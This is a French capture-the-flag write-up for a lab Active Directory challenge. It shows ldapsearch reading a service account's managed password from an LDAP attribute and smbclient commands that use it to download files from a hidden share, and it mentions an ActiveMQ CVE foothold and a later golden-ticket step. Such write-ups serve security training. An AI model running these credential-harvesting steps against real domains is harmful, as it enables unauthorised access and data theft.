---
title: "Operation Tervalis · File Vault"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "web-ad"
difficulty: "—"
points: 100
os: "—"
date: 2026-11-20
author: "Unpasswd"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/operation-tervalis/file-vault/writeup-file-vault.md"
license: "CC BY-SA 4.0"
status: published
---

# File Vault — Operation Tervalis Q10

## Objectif

Le serveur de fichiers **FS01** héberge des documents opérationnels
inaccessibles avec les privilèges de foothold. Il faut récupérer le flag
`flag-i210.txt` sur le partage caché `Backup-Archive`.

## État initial

- Instance VPN `172.28.31.0/24`, portail `172.28.31.3:8080`.
- FS01 identifié à `172.28.31.5` (port 445 ouvert).
- Foothold initial : compte de service `svc_web` obtenu via le portail
  ActiveMQ (CVE-2023-46604) et `/opt/activemq/conf/ad-connector.properties`.

## Reconnaissance AD

Le compte `svc_web` permet de lire l'OU des comptes de service. Le compte
`svc_gmsa_backup` expose dans son attribut `info` un blob `GMSA-BLOB:<base64>`
contenant son mot de passe géré en clair.

```bash
ldapsearch -x -H ldap://<DC> -D 'svc_web@valdoria.fbi.lab' -w '<redacted>' \
  -b 'OU=ServiceAccounts,DC=valdoria,DC=fbi,DC=lab' \
  '(sAMAccountName=svc_gmsa_backup)' info
```

Le mot de passe gMSA récupéré est `<redacted gMSA password>`.

## Partage caché

`FS01` expose `Backup-Archive` en `browseable=no` : il n'apparaît pas dans
`smbclient -L` (seul `IPC$` est listé). Le nom exact du partage est trouvé par
énumération TREE_CONNECT, puis l'accès est testé avec le compte gMSA :

```bash
smbclient -L //172.28.31.5 -U 'svc_gmsa_backup%<redacted>' \
  --option='client use kerberos=no'
# -> IPC$ uniquement

smbclient //172.28.31.5/Backup-Archive -U 'svc_gmsa_backup%<redacted>' \
  --option='client use kerberos=no' -c 'ls'
```

Contenu :

```text
tims_comm_intercepts.txt
flag-i210.txt
```

## Récupération

```bash
smbclient //172.28.31.5/Backup-Archive -U 'svc_gmsa_backup%<redacted>' \
  --option='client use kerberos=no' \
  -c 'get flag-i210.txt; get tims_comm_intercepts.txt'
```

Le fichier `flag-i210.txt` contient le flag du challenge. Il a été reporté
à la plateforme sous **File Vault** et n'est volontairement pas recopié ici.

`tims_comm_intercepts.txt` contient les intercepts ECHO/KAPPA et oriente la
suite (Q11) : chaîne via un compte de service avec délégation, partage
compartimenté, extraction du hash `krbtgt` pour un golden ticket.

## Chemins écartés

- `smbclient -L` ne montre que `IPC$` : le partage n'est pas énumérable.
- L'accès anonyme et les comptes sans privilège sont refusés.
- Le mot de passe gMSA n'est pas dans le partage ; il est dans l'attribut
  `info` du compte, lisible par `svc_web`.

## Validation

1. Monter le VPN de l'instance.
2. Vérifier `172.28.31.5:445` ouvert.
3. Se connecter à `Backup-Archive` avec `svc_gmsa_backup` et lister les
   fichiers.
4. Récupérer `flag-i210.txt` : le contenu est le flag soumis.
5. Vérifier que `tims_comm_intercepts.txt` est bien présent pour Q11.
